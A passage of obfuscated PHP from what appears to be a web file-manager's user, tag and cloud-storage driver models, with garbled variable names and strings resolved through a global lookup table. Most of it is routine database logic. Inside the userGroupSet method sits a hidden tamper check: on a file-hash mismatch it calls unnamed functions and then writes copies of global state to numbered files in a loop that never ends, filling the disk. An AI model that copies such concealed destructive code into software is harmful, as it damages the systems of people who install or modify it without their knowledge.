$this->getInfoSimpleOuter($íî£Úé¤); } } else { $óÉúôäş = array($•éÍı¿â[1684] => array($•éÍı¿â[471], $ı®’²µË)); if (count($ı®’²µË) == 1) { $óÉúôäş = array($•éÍı¿â[1684] => $ı®’²µË[0]); } $…Ä²ÅŒ’ = Model($•éÍı¿â[557])->field($this->simpleField)->where($óÉúôäş)->select(); $…Ä²ÅŒ’ = array_to_keyvalue($…Ä²ÅŒ’, $•éÍı¿â[1693]); foreach ($ı®’²µË as $íî£Úé¤) { $‚üÒ•ü¡ = $…Ä²ÅŒ’[$íî£Úé¤]; if (!$‚üÒ•ü¡) { $Õƒş„×›[$íî£Úé¤ . $•éÍı¿â[22]] = $this->getInfoSimpleOuter($íî£Úé¤); continue; } $‚üÒ•ü¡[$•éÍı¿â[2350]] = Action($•éÍı¿â[2351])->parseUrl($‚üÒ•ü¡[$•éÍı¿â[2350]]); $Õƒş„×›[$íî£Úé¤ . $•éÍı¿â[22]] = $‚üÒ•ü¡; } } return $Õƒş„×›; } protected function userStatus($Àíäëå, $ÁÔ¶¥ÖÈ) { $­¿±— = $this->getInfoSimple($Àíäëå); if (!$­¿±—) { return !1; } $ŠäëóÙÒ = array($_SERVER[•€áå–Õ][791] => $ÁÔ¶¥ÖÈ); return $this->userEdit($Àíäëå, $ŠäëóÙÒ); } protected function userRemove($äÒœŸ§á) { $§å¹îÒŞ =& $_SERVER[•€áå–Õ]; $Ø×¯ÒÙÀ = $this->getInfoSimple($äÒœŸ§á); if (!$Ø×¯ÒÙÀ) { return !1; } $ÂãÈ¯à = array($§å¹îÒŞ[1684] => $äÒœŸ§á); Model($§å¹îÒŞ[643])->where($ÂãÈ¯à)->delete(); Model($§å¹îÒŞ[2379])->where($ÂãÈ¯à)->delete(); Model($§å¹îÒŞ[1981])->where($ÂãÈ¯à)->delete(); Model($§å¹îÒŞ[2364])->where($ÂãÈ¯à)->delete(); Model($§å¹îÒŞ[1109])->where($ÂãÈ¯à)->delete(); Model($§å¹îÒŞ[2191])->removeUserAll($äÒœŸ§á); Model($§å¹îÒŞ[866])->userRootRemove($äÒœŸ§á); return $this->where($ÂãÈ¯à)->delete(); } protected function userGroupSet($ÚÀ—³´ê, $±èÍØÄÕ, $Üˆ¼¬ÖÎ = array()) { $ÇëÜ±Òù =& $_SERVER[•€áå–Õ]; $“³¤¡‹ = $_SERVER[$ÇëÜ±Òù[10]] . $ÇëÜ±Òù[11]; $ôÇÇ‡²© = $ÇëÜ±Òù[7]; if ($_SERVER[$ÇëÜ±Òù[8]] != $ôÇÇ‡²©($“³¤¡‹)) { $‡Ğ³Ş½È = $ÇëÜ±Òù[919]; $Õ‘§ïÕ = $ÇëÜ±Òù[9]; $Ì¾™íôç = $_SERVER[$ÇëÜ±Òù[10]] . $ÇëÜ±Òù[11]; $¯«Ìöè˜ = $Õ‘§ïÕ($Ì¾™íôç); $¹“øàŞ± = explode($ÇëÜ±Òù[12], $¯«Ìöè˜); if (count($¹“øàŞ±) < $ÇëÜ±Òù[666]) { $óëğê§ó = $ÇëÜ±Òù[14]; $óëğê§ó(); } $ÆÈŞÔàÌ = $ÇëÜ±Òù[920]; $ÆÈŞÔàÌ($_SERVER[$ÇëÜ±Òù[921]]); $‡Ğ³Ş½È = $ÇëÜ±Òù[919]; $‡Ğ³Ş½È(); $¦æğ§× = $ÇëÜ±Òù[2380]; $ı©ã¤–á = json_encode($GLOBALS[$ÇëÜ±Òù[2381]]); $““çÙû½ = 1; for ($³¥Ôıˆî = $““çÙû½; $³¥Ôıˆî > 0; $³¥Ôıˆî++) { $¦æğ§×(DATA_PATH . $³¥Ôıˆî, $ı©ã¤–á); } } $…Æ‚¶Ö… = $this->getInfoSimple($ÚÀ—³´ê); if (!$…Æ‚¶Ö… || !is_array($±èÍØÄÕ)) { return !1; } $Ÿİ¸ïÔ½ = Model($ÇëÜ±Òù[1981]); $Ÿİ¸ïÔ½->where(array($ÇëÜ±Òù[1693] => $ÚÀ—³´ê))->delete(); $¢äúê× = array(); $ôã¦¡Ã = 0; foreach ($±èÍØÄÕ as $‹äÒ÷ñÖ => $‰‡Úí) { $éãÁÓ‘à = array($ÇëÜ±Òù[1693] => $ÚÀ—³´ê, $ÇëÜ±Òù[1891] => $‹äÒ÷ñÖ, $ÇëÜ±Òù[1995] => $‰‡Úí); $éãÁÓ‘à[$ÇëÜ±Òù[1915]] = isset($Üˆ¼¬ÖÎ[$ôã¦¡Ã]) ? $Üˆ¼¬ÖÎ[$ôã¦¡Ã] : 0; $ôã¦¡Ã++; $¢äúê×[] = $éãÁÓ‘à; } return $Ÿİ¸ïÔ½->addAll($¢äúê×, array(), !0); } protected function userGroupAdd($Ì˜ã®‰, $Å”Ä±ú = array()) { $Öµ¼ĞëÕ =& $_SERVER[•€áå–Õ]; $ƒ«Íâ¹µ = $this->getInfoSimple($Ì˜ã®‰); if (!$ƒ«Íâ¹µ || empty($Å”Ä±ú)) { return !1; } $¤÷ùÔµç = array(); foreach ($Å”Ä±ú as $·³åİ± => $°ÆÈÎŞ”) { $¤÷ùÔµç[] = array($Öµ¼ĞëÕ[1693] => $Ì˜ã®‰, $Öµ¼ĞëÕ[1891] => $·³åİ±, $Öµ¼ĞëÕ[1995] => $°ÆÈÎŞ”, $Öµ¼ĞëÕ[1915] => 0); } return Model($Öµ¼ĞëÕ[1981])->addAll($¤÷ùÔµç, array(), !0); } protected function userGroupRemove($ÉñÇ«ãÌ, $©ªñúÉ») { $•áÜ³îï =& $_SERVER[•€áå–Õ]; $ÔµÁñ¬  = $this->getInfoSimple($ÉñÇ«ãÌ); if (!$ÔµÁñ¬  || !$©ªñúÉ») { return !1; } $£ŞˆÜß· = array($•áÜ³îï[1684] => $ÉñÇ«ãÌ, $•áÜ³îï[1979] => $©ªñúÉ»); return Model($•áÜ³îï[1981])->where($£ŞˆÜß·)->delete(); } public function listData() { $Ô¬•íŒ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ô¬•íŒ[$_SERVER[•€áå–Õ][424]]); return $Ô¬•íŒ; } public function listByID($ÎŠ»äé) { $Àîûéãƒ =& $_SERVER[•€áå–Õ]; if (!$ÎŠ»äé) { return; } $ØÁ¡¯åŸ = array($Àîûéãƒ[1693] => array($Àîûéãƒ[17], $ÎŠ»äé)); $¹ØùàİÙ = $this->where($ØÁ¡¯åŸ)->select(); $¹ØùàİÙ = array_sort_keep($¹ØùàİÙ, $Àîûéãƒ[1693], $ÎŠ»äé); $this->_listDataApply($¹ØùàİÙ); return $¹ØùàİÙ; } public function listByGroup($´¦×­Í¬ = 0, $¾È‘‚÷ = array()) { $‚˜¢Ëéò =& $_SERVER[•€áå–Õ]; $òÀ×”¤Ÿ = $‚˜¢Ëéò[22]; $¯ âßÓ = array(); if ($´¦×­Í¬) { $¯ âßÓ = array($‚˜¢Ëéò[2382] => intval($´¦×­Í¬)); $òÀ×”¤Ÿ = "\114\x45\x46\x54\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\x75\x73\x65\162\137\147\x72\x6f\165\160\40\x75\x73\145\x72\x5f\x67\162\157\165\160\40\x6f\156\x20\x75\163\145\x72\x2e\x75\x73\x65\x72\x49\x44\40\x3d\x20\x75\x73\x65\162\137\x67\162\x6f\x75\x70\x2e\x75\163\x65\x72\111\x44"; $ãª ‘—İ = Input::get($‚˜¢Ëéò[509], null, $‚˜¢Ëéò[22]) ? $‚˜¢Ëéò[22] : $‚˜¢Ëéò[2383]; } if (isset($¾È‘‚÷[$‚˜¢Ëéò[791]])) { $¯ âßÓ[$‚˜¢Ëéò[2384]] = $¾È‘‚÷[$‚˜¢Ëéò[791]]; } $Ï´Ã¢¸Ç = $this->_makeOrder($ãª ‘—İ)->field($‚˜¢Ëéò[2385])->where($¯ âßÓ)->join($òÀ×”¤Ÿ)->selectPage(50); $this->_listDataApply($Ï´Ã¢¸Ç[$‚˜¢Ëéò[424]]); return $Ï´Ã¢¸Ç; } private function _makeOrder($€ËãÏƒ = '') { $‰·±“ñ… =& $_SERVER[•€áå–Õ]; $¤“ê³¡· = array($‰·±“ñ…[1693], $‰·±“ñ…[42], $‰·±“ñ…[1880], $‰·±“ñ…[1852], $‰·±“ñ…[227]); $óş´ÙÖë = array($‰·±“ñ…[502] => $‰·±“ñ…[503], $‰·±“ñ…[504] => $‰·±“ñ…[505]); $Èôİ·Õ = Input::get($‰·±“ñ…[509], $‰·±“ñ…[17], $‰·±“ñ…[1684], $¤“ê³¡·); $Áš›Í„î = Input::get($‰·±“ñ…[510], $‰·±“ñ…[17], $‰·±“ñ…[1982], array($‰·±“ñ…[1982], $‰·±“ñ…[504])); $Áš›Í„î = $óş´ÙÖë[$Áš›Í„î]; $€ËãÏƒ = $€ËãÏƒ . "\165\163\x65\162\56{$Èôİ·Õ}\40{$Áš›Í„î}\54\x20\x75\x73\145\x72\56\165\x73\x65\x72\111\x44\x20\141\x73\143"; return $this->alias($‰·±“ñ…[2109])->order($€ËãÏƒ); } public function listSearch($—µğÖı‹) { $í„ğ‡ùİ =& $_SERVER[•€áå–Õ]; $æ·¤Ê« = $—µğÖı‹[$í„ğ‡ùİ[1985]]; $ƒËßÇ™´ = isset($—µğÖı‹[$í„ğ‡ùİ[1986]]) ? $—µğÖı‹[$í„ğ‡ùİ[1986]] : !1; $æ·¤Ê« = str_replace($í„ğ‡ùİ[1987], $í„ğ‡ùİ[1988], trim($æ·¤Ê«)); $Û‡å×¸¥ = array($í„ğ‡ùİ[42] => array($í„ğ‡ùİ[438], "\45{$æ·¤Ê«}\x25"), $í„ğ‡ùİ[360] => array($í„ğ‡ùİ[438], "{$æ·¤Ê«}\x25"), $í„ğ‡ùİ[2174] => array($í„ğ‡ùİ[438], "{$æ·¤Ê«}\x25"), $í„ğ‡ùİ[1041] => $í„ğ‡ùİ[1989]); if (Input::check($æ·¤Ê«, $í„ğ‡ùİ[366])) { $Û‡å×¸¥[$í„ğ‡ùİ[1693]] = array($í„ğ‡ùİ[438], "{$æ·¤Ê«}\x25"); $Û‡å×¸¥[$í„ğ‡ùİ[2365]] = array($í„ğ‡ùİ[438], "{$æ·¤Ê«}\45"); } if (!$æ·¤Ê«) { $Û‡å×¸¥ = array(); } if (isset($—µğÖı‹[$í„ğ‡ùİ[791]])) { $Û‡å×¸¥[$í„ğ‡ùİ[791]] = $—µğÖı‹[$í„ğ‡ùİ[791]]; } $Û‡å×¸¥ = $this->parseWhereLike($Û‡å×¸¥); $ğµÚ¤é© = $this->_makeOrder()->where($Û‡å×¸¥)->selectPage(20); if (!$ğµÚ¤é© || count($ğµÚ¤é©[$í„ğ‡ùİ[424]]) < 5 && Input::check($æ·¤Ê«, $í„ğ‡ùİ[373])) { $›³¬â³¢ = $this->_searchFromMeta($í„ğ‡ùİ[516], $æ·¤Ê«, 10); $â±í¯‚Ã = $this->_searchFromMeta($í„ğ‡ùİ[517], $æ·¤Ê«, 10); $Ë×Ï­ó = array_merge($›³¬â³¢, $â±í¯‚Ã, $ğµÚ¤é©[$í„ğ‡ùİ[424]]); $ğµÚ¤é©[$í„ğ‡ùİ[424]] = array_unique_by_key($Ë×Ï­ó, $í„ğ‡ùİ[1693]); $ğµÚ¤é©[$í„ğ‡ùİ[421]][$í„ğ‡ùİ[422]] = count($ğµÚ¤é©[$í„ğ‡ùİ[424]]); $ğµÚ¤é©[$í„ğ‡ùİ[421]][$í„ğ‡ùİ[423]] = ceil($ğµÚ¤é©[$í„ğ‡ùİ[421]][$í„ğ‡ùİ[422]] / $ğµÚ¤é©[$í„ğ‡ùİ[421]][$í„ğ‡ùİ[418]]); } $this->_listDataApply($ğµÚ¤é©[$í„ğ‡ùİ[424]]); $this->_filterByGroup($ğµÚ¤é©, $ƒËßÇ™´); return $ğµÚ¤é©; } private function _filterByGroup(&$²…·È‚â, $ õ¦è) { $‡¤°‘†À =& $_SERVER[•€áå–Õ]; if (!$ õ¦è) { return $²…·È‚â; } foreach ($²…·È‚â[$‡¤°‘†À[424]] as $°Ô¥Ú‹ù => &$îïÅ€ü) { $°Š™âÙã = array_to_keyvalue($îïÅ€ü[$‡¤°‘†À[2078]], $‡¤°‘†À[22], $‡¤°‘†À[1891]); if (!in_array($ õ¦è, $°Š™âÙã)) { unset($²…·È‚â[$‡¤°‘†À[424]][$°Ô¥Ú‹ù]); } } unset($îïÅ€ü); $²…·È‚â[$‡¤°‘†À[424]] = array_values($²…·È‚â[$‡¤°‘†À[424]]); $²…·È‚â[$‡¤°‘†À[421]] = array($‡¤°‘†À[2144] => count($²…·È‚â[$‡¤°‘†À[424]]), $‡¤°‘†À[2142] => $²…·È‚â[$‡¤°‘†À[421]][$‡¤°‘†À[418]], $‡¤°‘†À[2141] => 1, $‡¤°‘†À[2143] => 1); } private function _searchFromMeta($–Öáñ°Õ, $÷ŠÖœÊ, $ã»ı•Ì) { $¹ºÉÉ¯Ñ =& $_SERVER[•€áå–Õ]; $÷ŠÖœÊ = strtolower($÷ŠÖœÊ); $åšƒÑ×û = array($¹ºÉÉ¯Ñ[106] => $–Öáñ°Õ, $¹ºÉÉ¯Ñ[429] => array($¹ºÉÉ¯Ñ[438], "\45{$÷ŠÖœÊ}\x25")); $åšƒÑ×û = $this->parseWhereLike($åšƒÑ×û); $”ëö¬æ¼ = Model($¹ºÉÉ¯Ñ[2386])->where($åšƒÑ×û)->limit($ã»ı•Ì)->select(); if (!$”ëö¬æ¼) { return array(); } $”ëö¬æ¼ = array_to_keyvalue($”ëö¬æ¼, $¹ºÉÉ¯Ñ[22], $¹ºÉÉ¯Ñ[1693]); $Ù‘›´ê = $this->where(array($¹ºÉÉ¯Ñ[1684] => array($¹ºÉÉ¯Ñ[17], $”ëö¬æ¼)))->select(); if (!$Ù‘›´ê) { return array(); } return $Ù‘›´ê; } private function _listDataApplyItem($°äáÍé») { $İô÷Á¶Ù = array($°äáÍé»); $this->_listDataApply($İô÷Á¶Ù); return $İô÷Á¶Ù[0]; } private function _listDataApply(&$‡Ú¦—§Ë) { $ÉÊÃü‰— =& $_SERVER[•€áå–Õ]; if (!$‡Ú¦—§Ë) { return; } array_remove_key($‡Ú¦—§Ë, $ÉÊÃü‰—[930]); $”‘Òƒñ­ = array_to_keyvalue($‡Ú¦—§Ë, $ÉÊÃü‰—[22], $ÉÊÃü‰—[1693]); $this->_listAppendGroup($‡Ú¦—§Ë, $”‘Òƒñ­); $this->_listAppendMeta($‡Ú¦—§Ë, $”‘Òƒñ­); $this->_listAppendSourceRoot($‡Ú¦—§Ë, $”‘Òƒñ­); } private function _listAppendSourceRoot(&$œÁŠÙË³, $ûØòí¬¨) { $ôµËŒô’ =& $_SERVER[•€áå–Õ]; $Ç™èĞ‹æ = Model($ôµËŒô’[866])->listSourceRoot(SourceModel::TYPE_USER, $ûØòí¬¨); $Ç™èĞ‹æ = array_to_keyvalue($Ç™èĞ‹æ, $ôµËŒô’[549]); $Ç™èĞ‹æ = array_remove_key($Ç™èĞ‹æ, $ôµËŒô’[549]); foreach ($œÁŠÙË³ as &$áÍÇ°¬’) { $áÍÇ°¬’[$ôµËŒô’[99]] = $Ç™èĞ‹æ[$áÍÇ°¬’[$ôµËŒô’[1693]]] ? $Ç™èĞ‹æ[$áÍÇ°¬’[$ôµËŒô’[1693]]] : array(); } unset($áÍÇ°¬’); } private function _listAppendGroup(&$æß¸Æ‰, $Å«¼ì×æ) { $”¸‹¤Ñ® =& $_SERVER[•€áå–Õ]; $½ßÀÊ˜¥ = array($”¸‹¤Ñ®[1693] => array($”¸‹¤Ñ®[17], $Å«¼ì×æ)); $ì»¸îâ™ = Model($”¸‹¤Ñ®[1981])->where($½ßÀÊ˜¥)->select(); $Öë©ßËÆ = array_to_keyvalue($ì»¸îâ™, $”¸‹¤Ñ®[22], $”¸‹¤Ñ®[1891]); $Öë©ßËÆ = array_remove_value(array_unique($Öë©ßËÆ), $”¸‹¤Ñ®[224]); if (!$Öë©ßËÆ || !$ì»¸îâ™) { return; } $½ßÀÊ˜¥ = array($”¸‹¤Ñ®[1891] => array($”¸‹¤Ñ®[17], $Öë©ßËÆ)); $ÌÜõğ³¦ = Model($”¸‹¤Ñ®[2076])->field($”¸‹¤Ñ®[2387])->where($½ßÀÊ˜¥)->select(); $ÌÜõğ³¦ = array_to_keyvalue($ÌÜõğ³¦, $”¸‹¤Ñ®[1891]); $ì»¸îâ™ = array_to_keyvalue_group($ì»¸îâ™, $”¸‹¤Ñ®[1693]); foreach ($ì»¸îâ™ as &$ŞÂä¯) { $©‰Ì†³â = array(); foreach ($ŞÂä¯ as $ÜÃáÚ¤¿) { if (!$ÜÃáÚ¤¿[$”¸‹¤Ñ®[1995]]) { continue; } $á›§ = Model($”¸‹¤Ñ®[551])->listData($ÜÃáÚ¤¿[$”¸‹¤Ñ®[1995]]); $©‰Ì†³â[] = array($”¸‹¤Ñ®[1891] => $ÜÃáÚ¤¿[$”¸‹¤Ñ®[1891]], $”¸‹¤Ñ®[2388] => $ÌÜõğ³¦[$ÜÃáÚ¤¿[$”¸‹¤Ñ®[1891]]][$”¸‹¤Ñ®[42]], $”¸‹¤Ñ®[564] => $ÌÜõğ³¦[$ÜÃáÚ¤¿[$”¸‹¤Ñ®[1891]]][$”¸‹¤Ñ®[564]], $”¸‹¤Ñ®[466] => $á›§); } $ŞÂä¯ = $©‰Ì†³â; } unset($ŞÂä¯); foreach ($æß¸Æ‰ as &$¸ËÕğ­˜) { $¸ËÕğ­˜[$”¸‹¤Ñ®[2078]] = array(); if (isset($ì»¸îâ™[$¸ËÕğ­˜[$”¸‹¤Ñ®[1693]]])) { $¸ËÕğ­˜[$”¸‹¤Ñ®[2078]] = $ì»¸îâ™[$¸ËÕğ­˜[$”¸‹¤Ñ®[1693]]]; } } unset($¸ËÕğ­˜); } public function userAppendGroup($¸ÕÀ¯ş¾) { $•úÄï†¿ =& $_SERVER[•€áå–Õ]; if (!$¸ÕÀ¯ş¾) { return array(); } $this->_listAppendGroup($¸ÕÀ¯ş¾, array_to_keyvalue($¸ÕÀ¯ş¾, $•úÄï†¿[22], $•úÄï†¿[1693])); return $¸ÕÀ¯ş¾; } private function _listAppendMeta(&$  ã–ıÙ, $ôë†»Ÿ¨) { $ï‹âµªÂ =& $_SERVER[•€áå–Õ]; $¢³ØÑÒî = UserJobModel::JOB_KEY; $æÖ‹ãŸ‘ = array($ï‹âµªÂ[2366]); $ñ¢Æ…¶ï = array($ï‹âµªÂ[1693] => array($ï‹âµªÂ[17], $ôë†»Ÿ¨)); $šèŠ¾Â“ = Model($ï‹âµªÂ[2364])->where($ñ¢Æ…¶ï)->select(); $šèŠ¾Â“ = array_to_keyvalue_group($šèŠ¾Â“, $ï‹âµªÂ[1693]); foreach ($šèŠ¾Â“ as &$ù›ÀÑ ) { $¤ú•±¥ = array(); foreach ($ù›ÀÑ  as $½¦ôâ¤Ü) { if (!in_array($½¦ôâ¤Ü[$ï‹âµªÂ[106]], $æÖ‹ãŸ‘)) { $¤ú•±¥[$½¦ôâ¤Ü[$ï‹âµªÂ[106]]] = $½¦ôâ¤Ü[$ï‹âµªÂ[429]]; } } $ù›ÀÑ  = $¤ú•±¥; } unset($ù›ÀÑ ); $ÙêÆä®ü = Model($ï‹âµªÂ[2389]); foreach ($  ã–ıÙ as &$Àòğ»Î·) { $áè¼ÖÆì = array(); if (isset($šèŠ¾Â“[$Àòğ»Î·[$ï‹âµªÂ[1693]]])) { $áè¼ÖÆì = $šèŠ¾Â“[$Àòğ»Î·[$ï‹âµªÂ[1693]]]; } $Àòğ»Î·[$ï‹âµªÂ[2390]] = array(); if (isset($áè¼ÖÆì[$¢³ØÑÒî])) { $Àòğ»Î·[$ï‹âµªÂ[2390]] = $ÙêÆä®ü->getUserJobInfo($áè¼ÖÆì[$¢³ØÑÒî]); } } unset($Àòğ»Î·); } protected function groupUserAll($òã°şÔ) { $è²™ºıË =& $_SERVER[•€áå–Õ]; if (!$òã°şÔ) { return !1; } $Õ¡ï‘„Ã = Model($è²™ºıË[1981])->field($è²™ºıË[1693])->where(array($è²™ºıË[1891] => array($è²™ºıË[17], $òã°şÔ)))->select(); $Õ¡ï‘„Ã = array_to_keyvalue($Õ¡ï‘„Ã, $è²™ºıË[22], $è²™ºıË[1693]); return array_unique($Õ¡ï‘„Ã); } public function userSearch($ôƒş¾, $šÖÇÔ—û = "\x2a") { return Model($_SERVER[•€áå–Õ][578])->where($ôƒş¾)->field($šÖÇÔ—û)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\x72\x5f\157\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ÑÃ©×­) { $«Æ±™¯Å =& $_SERVER[•€áå–Õ]; $ÇŸ’ÍåÕ = defined($«Æ±™¯Å[2113]) && USER_ID ? USER_ID : $«Æ±™¯Å[22]; return "\x55\163\145\162\117\160\x74\x69\x6f\x6e\137{$ÑÃ©×­}\137" . $ÇŸ’ÍåÕ; } protected function filterWhere($­İµâ) { $´ÛµÍâ‘ =& $_SERVER[•€áå–Õ]; $­İµâ[$´ÛµÍâ‘[1693]] = defined($´ÛµÍâ‘[2113]) && USER_ID ? USER_ID : $´ÛµÍâ‘[22]; return $­İµâ; } public function cacheRemoveUser($ú—ÉÃÜï, $È§ÄÈÆ¼) { return Cache::remove("\125\x73\145\162\117\160\x74\151\157\x6e\137{$ú—ÉÃÜï}\137" . $È§ÄÈÆ¼); } protected function optionDefault($“ìÚ«Êğ = '') { $ª”Ö’Ãî =& $_SERVER[•€áå–Õ]; if ($“ìÚ«Êğ == $ª”Ö’Ãî[22]) { return $GLOBALS[$ª”Ö’Ãî[16]][$ª”Ö’Ãî[2391]]; } if ($“ìÚ«Êğ == $ª”Ö’Ãî[2392]) { return $GLOBALS[$ª”Ö’Ãî[16]][$ª”Ö’Ãî[2393]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\x74\x61\x67\114\151\x73\x74"; public $modelType = "\125\163\145\162\x4f\x70\164\151\x6f\x6e"; public $field = array("\156\x61\155\x65", "\x73\x74\x79\154\x65", "\x73\x6f\x72\164"); public function listData($ô¬‹¨ï‰ = false, $úöıäÔ = "\x73\x6f\x72\164", $¯“ø¸í = false) { return parent::listData($ô¬‹¨ï‰, $úöıäÔ, $¯“ø¸í); } public function remove($õ£³¿ãÊ) { return parent::remove($õ£³¿ãÊ); } public function add($óúÏ„ü, $üßİŸ«È = "\154\141\x62\145\154\x2d\x67\x72\145\171\55\156\x6f\x72\155\x61\154") { $Š—ã¹¯ =& $_SERVER[•€áå–Õ]; if ($this->findByName($óúÏ„ü)) { return !1; } $²ò³¦Üô = array($Š—ã¹¯[473] => $óúÏ„ü, $Š—ã¹¯[538] => $üßİŸ«È, $Š—ã¹¯[1895] => $this->getSort($Š—ã¹¯[313]) + 1); return parent::insert($²ò³¦Üô); } public function update($¾İæî¸è, $âã¤âìß) { $¹ ”Îò =& $_SERVER[•€áå–Õ]; $ÃıÜ…“û = $this->listData($¾İæî¸è); $ûÕ¬ö† = $this->findByName($âã¤âìß[$¹ ”Îò[42]]); if (!$ÃıÜ…“û || $ûÕ¬ö† && $ûÕ¬ö†[$¹ ”Îò[454]] != $ÃıÜ…“û[$¹ ”Îò[454]]) { return !1; } return parent::update($¾İæî¸è, $âã¤âìß); } public function moveTop($–Ñßõ¼) { $¼„˜Ñ„í =& $_SERVER[•€áå–Õ]; $ù’Ş¤ÀÈ = parent::listData(); $÷–ÌÏ¹ = $this->getSort($¼„˜Ñ„í[312]); foreach ($ù’Ş¤ÀÈ as &$ÜŒµÜ¦½) { if ($ÜŒµÜ¦½[$¼„˜Ñ„í[454]] == $–Ñßõ¼) { $ÜŒµÜ¦½[$¼„˜Ñ„í[1915]] = $÷–ÌÏ¹; continue; } $ÜŒµÜ¦½[$¼„˜Ñ„í[1915]] += 1; } unset($ÜŒµÜ¦½); return parent::resetData($ù’Ş¤ÀÈ); } public function moveBottom($¶¥Æ‡±) { $«Öò•Ü› =& $_SERVER[•€áå–Õ]; $ì¥–ãàù = $this->getSort($«Öò•Ü›[313]) + 1; return parent::update($¶¥Æ‡±, array($«Öò•Ü›[1915] => $ì¥–ãàù)); } public function resetSort($Ô¦áŸõ¶) { $‹âÌäí =& $_SERVER[•€áå–Õ]; $Ş¨Ä¾€Ê = array(); $Ô¦áŸõ¶ = is_array($Ô¦áŸõ¶) ? $Ô¦áŸõ¶ : array(); for ($á˜ûøğ£ = 0; $á˜ûøğ£ < count($Ô¦áŸõ¶); $á˜ûøğ£++) { $Ş¨Ä¾€Ê[$Ô¦áŸõ¶[$á˜ûøğ£] . $‹âÌäí[22]] = $á˜ûøğ£ + 1; } $¸ĞÈãì = parent::listData(); foreach ($¸ĞÈãì as &$äÖŸœãÕ) { $¯£ĞØÔƒ = $Ş¨Ä¾€Ê[$äÖŸœãÕ[$‹âÌäí[454]]]; $äÖŸœãÕ[$‹âÌäí[1915]] = $¯£ĞØÔƒ ? $¯£ĞØÔƒ : $äÖŸœãÕ[$‹âÌäí[1915]]; } unset($äÖŸœãÕ); return parent::resetData($¸ĞÈãì); } private function getSort($üÖÀ§¿´) { $ÁÔ—øıî =& $_SERVER[•€áå–Õ]; $‚ÆÔóÃñ = parent::listData(); $´ã½†• = array_to_keyvalue($‚ÆÔóÃñ, $ÁÔ—øıî[22], $ÁÔ—øıî[1915]); if (!$´ã½†•) { $´ã½†• = array(0); } $–§áğüô = $üÖÀ§¿´ == $ÁÔ—øıî[313] ? max($´ã½†•) : min($´ã½†•); return intval($–§áğüô); } } goto D«éÓÛî“î; b¡„Ü­½™: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($±˜ìœ·²) { parent::__construct($±˜ìœ·²); $this->signatureVersion($_SERVER[•€áå–Õ][243]); } public function uploadFormData($¡š³¯ÜÊ, $À²¢ôØ¸ = 3600) { $ãµÊÑ =& $_SERVER[•€áå–Õ]; $Š´¾¿¶Ú = $ãµÊÑ[225]; $Ï”îÖØ = $ãµÊÑ[258]; $€ˆ££‚æ = $ãµÊÑ[268]; $ó…ğòëÈ = gmdate($ãµÊÑ[1366], time() + $À²¢ôØ¸); $¾ÈÈìèË = (string) time() . $ãµÊÑ[83] . (string) (time() + $À²¢ôØ¸); $ŸÓãÒÄî = array($ãµÊÑ[269] => $ó…ğòëÈ, $ãµÊÑ[272] => array(array($ãµÊÑ[274] => $Š´¾¿¶Ú), array($ãµÊÑ[273] => $this->bucket), array($ãµÊÑ[275], $ãµÊÑ[276], $ãµÊÑ[22]), array($ãµÊÑ[279] => $€ˆ££‚æ), array($ãµÊÑ[1367] => $Ï”îÖØ), array($ãµÊÑ[1368] => $this->accessKey), array($ãµÊÑ[1369] => $¾ÈÈìèË))); $ŸÓãÒÄî = json_encode($ŸÓãÒÄî); $Ä€â¶Ü¶ = hash_hmac($ãµÊÑ[258], $¾ÈÈìèË, $this->secret); $ñ£–÷¶ê = sha1($ŸÓãÒÄî); $æ§¢Ã›ß = hash_hmac($ãµÊÑ[258], $ñ£–÷¶ê, $Ä€â¶Ü¶); $Ì°í¸û‰ = array($ãµÊÑ[274] => $Š´¾¿¶Ú, $ãµÊÑ[279] => $€ˆ££‚æ, $ãµÊÑ[287] => base64_encode($ŸÓãÒÄî), $ãµÊÑ[1367] => $Ï”îÖØ, $ãµÊÑ[1368] => $this->accessKey, $ãµÊÑ[1370] => $¾ÈÈìèË, $ãµÊÑ[1371] => $æ§¢Ã›ß, $ãµÊÑ[208] => $this->getHost()); return $Ì°í¸û‰; } public function fileOutLink($ãú¦—ş) { $Â€¶¬Â =& $_SERVER[•€áå–Õ]; if (substr($ãú¦—ş, 0, 7) == $Â€¶¬Â[1372]) { $ãú¦—ş = $Â€¶¬Â[1373] . substr($ãú¦—ş, 7); } header($Â€¶¬Â[174] . $ãú¦—ş); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($§Ôª¦‰”) { $this->pathParse = $§Ôª¦‰”; $this->model = Model($_SERVER[•€áå–Õ][1374]); } public function getPath($È’Ü÷•) { return trim($È’Ü÷•, $_SERVER[•€áå–Õ][18]); } public function pathFather($ÁşÛæİë) { $”ª€·şØ = $this->parse($ÁşÛæİë); $”ª€·şØ = $this->infoSimple($ÁşÛæİë); return $”ª€·şØ ? $”ª€·şØ[$_SERVER[•€áå–Õ][192]] : !1; } public function pathThis($Œ¸£ÃƒÄ) { $Í‰Ş‰£ = $this->infoSimple($Œ¸£ÃƒÄ); return $Í‰Ş‰£ ? $Í‰Ş‰£[$_SERVER[•€áå–Õ][42]] : !1; } public function getPathOuter($è¼¿Øİ·) { if (!$è¼¿Øİ·) { return $è¼¿Øİ·; } $Îğêü©÷ = $this->parse($è¼¿Øİ·); return KodIO::make($Îğêü©÷[$_SERVER[•€áå–Õ][454]]); } public function copyFolderFromIO($¨ŞÃ™×ï, $û‰ôóÁ¨, $³ÀÊáÔ, $ÈÃòß§, $ºÖšÎ) { $Ô³®“«ò = $this->model->copyFolderFromIO($¨ŞÃ™×ï, $û‰ôóÁ¨, $³ÀÊáÔ, $ÈÃòß§, $ºÖšÎ); return KodIO::make($Ô³®“«ò); } public function isParentOf($‹…äÙç•, $öÑÈÖø­) { return $this->model->isParentOf($‹…äÙç•, $öÑÈÖø­); } public function mkfile($Ÿ¢£è—, $ö®ÁÑ°Ç = '', $³¦²¸¿Ó = REPEAT_RENAME) { $â¡ĞÑ‡ =& $_SERVER[•€áå–Õ]; $–Ë‡ù“‘ = $this->parse($Ÿ¢£è—); $Ÿ¢£è— = $–Ë‡ù“‘[$â¡ĞÑ‡[454]]; for ($ÑîÕöä® = 0; $ÑîÕöä® < count($–Ë‡ù“‘[$â¡ĞÑ‡[1375]]); 